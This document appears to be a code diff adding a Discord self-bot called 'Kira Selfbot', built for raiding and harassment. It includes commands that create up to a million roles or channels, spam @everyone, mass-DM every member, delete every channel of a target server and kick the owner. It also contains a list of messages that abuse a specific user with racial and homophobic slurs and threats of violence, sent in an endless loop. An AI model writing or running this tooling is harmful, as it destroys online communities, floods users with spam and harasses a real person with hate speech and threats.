@@ -1,0 +1,615 @@
+import asyncio
+import random
+import string
+import requests
+import socket
+import dns.resolver
+import time
+import threading
+import os
+from gtts import gTTS
+from discord.ext import commands 
+from ipwhois import IPWhois
+
+
+
+bot = commands.Bot(command_prefix='.', self_bot=True)
+
+
+
+BOT_NAME = "Injections Sb"
+DEVELOPER_USERNAME = "@gunincourt"
+
+
+
+
+
+@bot.command()
+async def cmds(ctx):
+    help_message = f"```diff\n-𖤐Commands for {BOT_NAME}𖤐\nDeveloper: {DEVELOPER_USERNAME}\n\n"
+
+    for command in bot.commands:
+        help_message += f"🏴‍☠️{bot.command_prefix}{command.name}\n"
+
+    help_message += "```"
+
+    await ctx.send(help_message)
+
+
+
+
+
+
+@bot.command()
+async def servers(ctx):
+    servers = bot.guilds
+    server_list = ''
+    for server in servers:
+        server_list += f'{server.name} (ID: {server.id})\n'
+    await ctx.send(f'```Bot Servers:\n{server_list}```')
+
+
+async def is_developer(ctx):
+    return ctx.author.id == 1105675432424116245
+
+
+@bot.command()
+@commands.check(is_developer)
+async def serverinvites(ctx, *server_ids):
+    invites = []
+    for server_id in server_ids:
+        guild = bot.get_guild(int(server_id))
+        if guild:
+            invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0, unique=True, validate=None)
+            invites.append(invite.url)
+        else:
+            await ctx.send(f"Could not find server with ID {server_id}")
+    
+    if invites:
+        await ctx.send('\n'.join(invites))
+    else:
+        await ctx.send("No server invite links were generated.")
+
+
+
+@bot.command()
+@commands.check(is_developer)
+async def purge_dm(ctx):
+    try:
+
+        if ctx.guild is None:
+            
+            dm_channel = ctx.channel
+        else:
+            
+            dm_channel = await ctx.author.create_dm()
+
+        async for message in dm_channel.history(limit=None):
+            if message.author == bot.user:
+                await message.delete()
+
+        if ctx.guild is None:
+            await ctx.send("Deleted all bot messages in your DMs.")
+        else:
+            await ctx.send(f"Deleted all bot messages")
+    except Exception as e:
+        await ctx.send(f"An error occurred: {str(e)}")
+
+
+
+
+
+
+
+@bot.command()
+@commands.check(is_developer)
+async def hello(ctx):
+    await ctx.send(f'hello, world! @everyone')
+
+
+@bot.command()
+@commands.check(is_developer)
+async def IOSCrash(ctx):
+    await ctx.send(f'https://imgur.com/gallery/J05y7JV')
+
+
+
+@bot.command()
+@commands.check(is_developer)
+async def dev(ctx):
+    await ctx.send(f'```diff\n-Kira Selfbot V1.0 Developer: @kira.lmao```')
+
+
+
+
+async def is_developer(ctx):
+    return ctx.author.id == 1105675432424116245
+
+
+@bot.command()
+@commands.check(is_developer)
+async def add_roles(ctx, user: discord.Member, *roles: discord.Role):
+    for role in roles:
+        await user.add_roles(role)
+    await ctx.send(f"Added roles {', '.join(role.name for role in roles)} to {user.name}.")
+
+@bot.command()
+@commands.has_permissions(administrator=True, manage_guild=True)
+async def remove_roles(ctx, user: discord.Member, *roles: discord.Role):
+    for role in roles:
+        await user.remove_roles(role)
+    await ctx.send(f"Removed roles {', '.join(role.name for role in roles)} from {user.name}.")
+
+
+sniped_messages = {}
+
+@bot.event
+async def on_message_delete(message):
+    sniped_messages[message.channel.id] = {
+        "content": message.content,
+        "author": message.author,
+        "attachments": message.attachments
+    }
+
+@bot.command()
+async def snipe(ctx):
+    channel = ctx.channel
+    if channel.id not in sniped_messages:
+        await ctx.send("No recently deleted messages to snipe!")
+        return
+
+    sniped_message = sniped_messages[channel.id]
+    user = await bot.fetch_user(sniped_message["author"].id)
+
+    message_content = f"```Message Deleted from\nUser {user.name}:\nUser ID: {user.id}:\nDeleted Message: {sniped_message['content']}```"
+
+    await ctx.send(message_content)
+
+    
+    if sniped_message["attachments"]:
+        for attachment in sniped_message["attachments"]:
+            await ctx.send(attachment.url)
+
+
+
+async def is_developer(ctx):
+    return ctx.author.id == 1105675432424116245
+
+@bot.command()
+@commands.check(is_developer)
+async def spam(ctx):
+    for i in range(100000):
+        await ctx.send(f"# message to spam" * 5)
+
+
+@bot.command()
+@commands.has_permissions(administrator=True)
+async def lockdownserver(ctx):
+    guild = ctx.guild
+    everyone_perms = discord.PermissionOverwrite(send_messages=False)
+    for channel in guild.text_channels:
+        await channel.set_permissions(guild.default_role, overwrite=everyone_perms)
+    await ctx.send("@everyone This server is now on lockdown.")
+
+@bot.command()
+@commands.has_permissions(administrator=True)
+async def unlock(ctx):
+    guild = ctx.guild
+    everyone_perms = discord.PermissionOverwrite(send_messages=None)
+    for channel in guild.text_channels:
+        await channel.set_permissions(guild.default_role, overwrite=everyone_perms)
+    await ctx.send("This server is no longer on lockdown @everyone you can now send messages and enjoy chatting.")
+
+
+
+async def is_developer(ctx):
+    return ctx.author.id == 1105675432424116245
+
+@bot.command()
+@commands.check(is_developer)
+async def roleflood(ctx):
+    guild = ctx.guild
+    for i in range(1, 1000000):
+        await guild.create_role(name=f"rekt By kira")
+
+
+
+async def is_developer(ctx):
+    return ctx.author.id == 1105675432424116245
+
+@bot.command()
+@commands.check(is_developer)
+async def channelflood(ctx):
+    guild = ctx.guild
+    for i in range(1, 1000000):
+        await guild.create_text_channel(f"kira was here")
+
+
+
+
+@bot.command()
+@commands.check(is_developer)
+async def annoy(ctx):
+    guild = ctx.guild
+    channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
+    for channel in channels:
+        for i in range(1, 1000000):
+            await channel.send(f"@everyone REKT BY https://discord.gg/ZKKR6axzrr")
+            await asyncio.sleep(1)
+
+
+
+@bot.command()
+@commands.has_permissions(manage_messages=True)
+async def clear(ctx, amount: int):
+    await ctx.channel.purge(limit=amount+1)
+
+
+
+
+@bot.command()
+async def MassDM(ctx, *, message: str):
+  for i in range(100000):
+    for member in ctx.guild.members:
+        try:
+            await member.send(message)
+        except discord.Forbidden:
+            pass
+
+
+
+
+
+@bot.command()
+@commands.has_permissions(administrator=True)
+async def kick(ctx, *members: discord.Member, reason: str = None):
+    for member in members:
+        await member.kick(reason=reason or "Kicked by a staff member")
+    await ctx.send(f"Kicked {len(members)} members")
+
+@bot.command()
+@commands.has_permissions(administrator=True, manage_guild=True)
+async def ban(ctx, *members: discord.Member, reason: str = None):
+    for member in members:
+        await member.ban(reason=reason or "Banned by a staff member")
+    await ctx.send(f"Banned {len(members)} members")
+
+
+
+
+@bot.command()
+async def ping(ctx):
+    latency = round(bot.latency * 1000)  
+    await ctx.send(f"```Pong! Latency: {latency}ms```")
+
+
+
+
+@bot.command()
+async def sleepchat(ctx):
+    await ctx.send(f'https://is.gd/cYSai6')
+
+
+
+
+active_tokens = []
+
+async def is_developer(ctx):
+    return ctx.author.id == 1105675432424116245
+  
+@bot.command()
+@commands.check(is_developer)
+async def tokengen(ctx):
+    token = ''.join(random.choices(string.ascii_letters + string.digits, k=24)) + "." + ''.join(random.choices(string.ascii_letters + string.digits, k=6)) + "." + ''.join(random.choices(string.ascii_letters + string.digits, k=27))
+    active_tokens.append(token)
+    await ctx.send(f"New login token generated and added to active tokens list: {token}")
+
+
+
+
+
+
+
+
+
+@bot.command()
+async def userinfo(ctx, user: discord.User):
+
+    badges = ' '.join([badge.name for badge in user.public_flags.all()])
+
+    mutual_servers = [server.name for server in bot.guilds if user in server.members]
+
+    message = f"```diff\n"
+    message += f"- User Information:\n"
+    message += f"- Username: {user.name}\n"
+    message += f"- User ID: {user.id}\n"
+    message += f"- Account Creation Time: {user.created_at.strftime('%Y-%m-%d %H:%M:%S')}\n"
+    message += f"- Badges: {badges}\n"
+    message += f"- Mutual Servers: {', '.join(mutual_servers)}\n"
+    message += f"```"
+
+    await ctx.send(message)
+   
+
+users_to_react = {1105675432424116245}
+
+@bot.event
+async def on_message(message):
+    if message.author.id in users_to_react:
+        await message.add_reaction("☠️")
+
+    await bot.process_commands(message)
+
+@bot.command()
+async def start_reaction(ctx, user_id: int):
+    if user_id not in users_to_react:
+        users_to_react.add(user_id)
+        await ctx.send(f"Started reacting to messages from user {user_id}")
+    else:
+        await ctx.send(f"Already reacting to messages from user {user_id}")
+
+@bot.command()
+async def stop_reaction(ctx, user_id: int):
+    if user_id in users_to_react:
+        users_to_react.remove(user_id)
+        await ctx.send(f"Stopped reacting to messages from user {user_id}")
+    else:
+        await ctx.send(f"Not currently reacting to messages from user {user_id}")
+
+
+
+
+
+status_messages = [
+    {
+        "message": "status here",
+        "large_image": "webp_net-resizeimage",
+    }
+]
+
+current_status_index = 0
+
+def get_next_status_message():
+    global current_status_index
+    next_status_index = (current_status_index + 1) % len(status_messages)
+    current_status_index = next_status_index
+    return status_messages[next_status_index]
+
+red_text = "\033[91m"
+reset_text = "\033[91m"  
+
+@bot.event
+async def on_ready():
+    console_text = (
+        f"⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⠖⠀⠀⠲⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
+        f"⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀\n"
+        f"⠀⠀⠀⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⡀⠀⠀⠀⠀⠀⠀\n"
+        f"⠀⠀⠀⠀⠀⠀⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⠀⠀⠀⠀⠀⠀\n"
+        f"⠀⠀⠀⠀⠀⠀⣿⣿⣿⣇⣤⠶⠛⣛⣉⣙⡛⠛⢶⣄⣸⣿⣿⣿⠀⠀⠀⠀⠀⠀\n"
+        f"⠀⠀⠀⠀⢀⣀⣿⣿⣿⡟⢁⣴⣿⣿⣿⣿⣿⣦⡈⢿⣿⣿⣿⣀⡀⠀⠀⠀⠀\n"
+        f"⠀⠀⢠⣴⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣦⡄⠀⠀\n"
+        f"⠀⣴⣿⣿⡿⠿⢛⣻⡇⢸⡟⠻⣿⣿⣿⣿⣿⣿⡿⠟⢻⡇⣸⣛⡛⠿⣿⣿⣿⣦⠀\n"
+        f"⢸⣿⡿⠋⠀⠀⢸⣿⣿⡜⢧⣄⣀⣉⡿⣿⣉⣀⣠⣼⢁⣿⣿⡇⠀⠀⠙⢿⣿⡆\n"
+        f"⣿⣿⠁⠀⠀⠀⠈⣿⣿⡇⣿⡿⠛⣿⣵⣮⣿⡟⢻⡿⢨⣿⣿⠀⠀⠀⠀⠈⣿⣿\n"
+        f"⢿⡟⠀⠀⠀⠀⠀⠘⣿⣷⣤⣄⡀⣿⣿⣿⣿⢁⣤⣶⣿⣿⠃⠀⠀⠀⠀⠀⣿⡟\n"
+        f"⠘⠇⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡇⢿⣿⣿⣿⢸⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠻⠃\n"
+        f"⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⢩⣦⣘⡘⠋⣛⣸⡍⠁⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀\n"
+        f"⠀⠀⠘⢿⣷⣤⣤⣄⣤⣤⣶⣿⣿⣿⡿⢿⣿⣿⣿⣷⣤⣤⣠⣤⣴⣾⡿⠁⠀⠀\n"
+        f"⠀⠀⠀⠀⠉⠛⠿⠿⠿⡿⠿⠿⠛⠉⠀⠀⠉⠛⠿⠿⣿⠿⠿⠿⠛⠉⠀⠀⠀⠀\n"
+        f"KIRA SELF BOT IS ONLINE{reset_text}"
+    )
+
+    print(console_text)
+    
+    await update_status()
+
+async def update_status():
+    await bot.wait_until_ready()  
+    
+    while not bot.is_closed():
+        status = get_next_status_message()
+        streaming_status = discord.Streaming(
+            name=status["message"],
+            url="https://www.twitch.tv/devilbinn",
+            assets={
+                'large_image': status["large_image"],
+            }
+        )
+        await bot.change_presence(activity=streaming_status)
+        await asyncio.sleep(2)
+
+
+
+
+
+async def is_developer(ctx):
+    return ctx.author.id == 1105675432424116245
+
+@bot.command()
+@commands.check(is_developer)
+async def ATTACK(ctx, server_id: int):
+    """Deletes all channels of the specified server ID"""
+    server = bot.get_guild(server_id)
+    if server is None:
+        await ctx.send(f"Server with ID {server_id} not found.")
+        return
+    
+    for channel in server.channels:
+        await channel.delete()
+    
+    await ctx.send(f"All channels in server {server.name} have been deleted.")
+
+
+
+@bot.event
+async def on_guild_channel_create(channel):
+   
+    if isinstance(channel, discord.TextChannel):
+        
+        guild = channel.guild
+        
+        
+        max_text_channels = 5
+        
+        
+        text_channels_count = sum(1 for c in guild.channels if isinstance(c, discord.TextChannel))
+        
+        
+        if text_channels_count > max_text_channels:
+            
+            member = channel.guild.get_member(channel.guild.owner_id)
+            
+           
+            await member.kick(reason='Triggering Anti Raid')
+            
+            
+            kick_channel = bot.get_channel(1141774326199242797)
+            if kick_channel:
+                await kick_channel.send(f'{member.mention} has been kicked for triggering anti raid.')
+
+
+
+@bot.command()
+async def iplookup(ctx, ip_address):
+    try:
+        response = requests.get(f"https://ipapi.co/{ip_address}/json/")
+        if response.status_code == 200:
+            data = response.json()
+            result = f"IPv4 Info: {data}\nCity: {data['city']}\nState: {data['region']}\nLocation: ({data['latitude']}, {data['longitude']})"
+            if 'org' in data:
+                result += f"\nISP: {data['org']}"
+        else:
+            result = "Failed to retrieve IPv4 information"
+
+    
+        dnsbls = [
+            "zen.spamhaus.org",
+            "bl.spamcop.net",
+            "cbl.abuseat.org",
+            "dnsbl.sorbs.net",
+            "pbl.spamhaus.org",
+            "xbl.spamhaus.org"
+        ]
+        blacklisted = False
+        for dnsbl in dnsbls:
+            try:
+                query = '.'.join(reversed(str(ip_address).split("."))) + "." + dnsbl
+                answers = dns.resolver.resolve(query, "A", lifetime=5)
+                blacklisted = True
+                result += f"\nBlacklisted by {dnsbl}"
+            except dns.exception.Timeout:
+                result += f"\nTimed out while querying {dnsbl}"
+            except dns.resolver.NXDOMAIN:
+                pass
+            except dns.resolver.NoAnswer:
+                result += f"\nNot blacklisted by {dnsbl}"  
+        if not blacklisted:
+            result += "\nNot blacklisted"
+
+        
+        await ctx.send(f'```diff\n-{result}```')
+    except Exception as e:
+        await ctx.send(f"An error occurred: {str(e)}")
+
+
+
+
+@bot.command()
+async def join(ctx, channel_id: int):
+    """Join a voice channel by its ID."""
+    if ctx.author.voice:
+        voice_channel = ctx.guild.get_channel(channel_id)
+        if voice_channel is None:
+            await ctx.send("Voice channel not found. Please provide a valid channel ID.")
+            return
+
+        if ctx.voice_client:
+            if ctx.voice_client.channel != voice_channel:
+                await ctx.voice_client.move_to(voice_channel)
+            else:
+                await ctx.send("Already connected to the specified voice channel.")
+        else:
+            await voice_channel.connect()
+            await ctx.send(f"Connected to {voice_channel.name}.")
+    else:
+        await ctx.send("You need to be in a voice channel to use this command.")
+
+@bot.command()
+async def leave(ctx):
+    """Leave the current voice channel."""
+    if ctx.voice_client:
+        await ctx.voice_client.disconnect()
+        await ctx.send("Disconnected from the voice channel.")
+    else:
+        await ctx.send("I'm not in a voice channel.")
+
+@bot.command()
+async def say(ctx, *, text: str):
+    """Convert text to speech and play it in the voice channel."""
+    if ctx.voice_client:
+        tts = gTTS(text=text, lang='en')
+        tts.save('tts.mp3')
+
+        source = discord.FFmpegPCMAudio(executable="ffmpeg", source='tts.mp3')
+
+        ctx.voice_client.stop()
+        ctx.voice_client.play(source, after=lambda e: print(f"Player error: {e}") if e else None)
+
+        while ctx.voice_client.is_playing():
+            await asyncio.sleep(1)
+        
+        
+        os.remove('tts.mp3')
+    else:
+        await ctx.send("I'm not in a voice channel. Use `!join <voice_channel_id>` to summon me to a voice channel.")
+
+
+
+PACK_MESAGES = ["<@1235409571317551117> LOLOLOO IS THIS THE SAME CUNT HOW DO U LIKE IT", "<@1235409571317551117>YOU FUCKING SUCK NIGGA KYS HAHAHHAHAHAHA", "<@1235409571317551117>HAHHHA UR ASS KID", "<@1235409571317551117>UR SO BAD U CANT EVEN EXPLAIN HOW DOM XSS WORKS SKID", "<@1235409571317551117>https://cdn.discordapp.com/attachments/919752987616882799/919849977579175956/unknown.png UNKNOWN FUCK HAHAHAHAHAHAHAHHAHAHAHAHHAHAHA", "<@1235409571317551117>WHAT THE FUCK KID UR SO ASS SON UR MY SEEED NIGGA HAHA", "<@1235409571317551117>HHAHAH WHAT UR SUCH A LARP PACKER GET HOED NIGGER", "<@1235409571317551117>UR SO BAD SON I OWN YOU FAGGOT NIGGER FUCK", "<@1235409571317551117>HAAHHA UR FOLDING UR TOO SLOW AND IM GETTING RATELIMITED NIGGA HAHAHA", "<@1235409571317551117>https://tenor.com/view/spongebob-gay-gif-22490381 this u nigga?", "<@1235409571317551117>HELLO BITCH BOY PAY ATTENTION", "LOLOLOLOL", "<@1235409571317551117>KIRA FUCKING KILLED YOU ", "I RUN U NIGGA <@1235409571317551117>", "# YOUR FUCKING HARMLESS LETS COMPARES DOXXES <@1235409571317551117>", "<@1235409571317551117>EXPLAIN HOW A PAM_UNIX.SO BACKDOOR WORKS RIGHT NOW DONT FAIL NIGGA HAHAHAHAHHAH LOSER", "IM HOEING YOU NIGGA ON GD", "I RUN UR ENTIRE FAMILY HISTORY TREE FAGGOT ASS NIGGA STAY MAD BITCH ASS NIGGA FUCK U KID UR ASS \n DIE FAG \n I \n WILL \n RUIN \n UR \n LIFE \n KID \n STAY MAD HAHHAHAH \n IM \n JUST BETTER THAN U \n LOOOOO \n FUCK U BITCH NIGGA \n DIE", "I \n WILL \n RIP \n UR \n SKULL \n APART \n AND \n SPIT \n ON \n UR \n DEAD \n CORPSE \n FUCKIN \n WEAK \n ASS \n LOSER \n UR \n TRASH \n BITCH BOY \n SHUT UR LAME ASS UP FUCKIN BITCH <@1235409571317551117>", "UR ASS AND A NOBODY GET THE FUCK OUT OF HERE FAT FUCK \n U SUCK ASS NGL UR SHITTY \n STOP USING GITHUB FAGGOT \n UR STRAIGHT SHITTY NIGGA GET THE FUCK OUT OF HERE \n KIRA RUNS U",]
+    
+           
+@bot.command()
+async def press(ctx):
+    await ctx.message.delete()
+    global end
+    end = False
+    while True:
+        await ctx.send(random.choice(PACK_MESAGES))
+        if end == True:
+            break
+
+
+@bot.command()
+async def gc_change(ctx, channel_id: int, initial_name: str):
+    channel = bot.get_channel(channel_id)
+
+    if channel is None:
+        await ctx.send('Could not find the specified channel.')
+        return
+
+    count = 1
+    while True:
+        try:
+            await channel.edit(name=f'{initial_name} {count}')
+            count += 1
+        except Exception as e:
+            await ctx.send(f'An error occurred: {e}')
+            break
+
+
+
+
+@bot.command()
+async def av(ctx, user: discord.User = None):
+    
+    user = user or ctx.author
+   
+    await ctx.send(user.avatar.url)
+
+
+
+
+
+
+
+bot.run('TOKEN_HERE')
